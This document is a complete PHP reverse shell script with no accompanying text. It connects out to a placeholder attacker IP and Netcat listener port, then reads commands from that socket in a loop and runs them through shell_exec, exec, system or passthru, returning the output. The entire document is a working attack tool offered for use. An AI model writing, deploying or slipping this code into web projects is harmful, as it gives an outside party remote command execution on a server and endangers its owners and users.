```php
<?php
set_time_limit(0);
$ip = "YOUR_IP";  // Change this to your attack machine's IP
$port = 1234;     // Change this to your Netcat listener port

$socket = fsockopen($ip, $port);
if (!$socket) {
    die("Connection failed.");
}

fwrite($socket, "Connected to Reverse Shell\n");

function execute_command($cmd) {
    $output = "";
    if (function_exists("shell_exec")) {
        $output = shell_exec($cmd . " 2>&1");
    } elseif (function_exists("exec")) {
        exec($cmd . " 2>&1", $out);
        $output = implode("\n", $out);
    } elseif (function_exists("system")) {
        ob_start();
        system($cmd . " 2>&1");
        $output = ob_get_clean();
    } elseif (function_exists("passthru")) {
        ob_start();
        passthru($cmd . " 2>&1");
        $output = ob_get_clean();
    } else {
        $output = "No function available to execute commands.";
    }
    return $output;
}

while (true) {
    fwrite($socket, "shell> ");
    $cmd = trim(fgets($socket, 2048));
    if ($cmd === "exit") {
        break;
    }
    fwrite($socket, execute_command($cmd));
}

fclose($socket);
?>
```
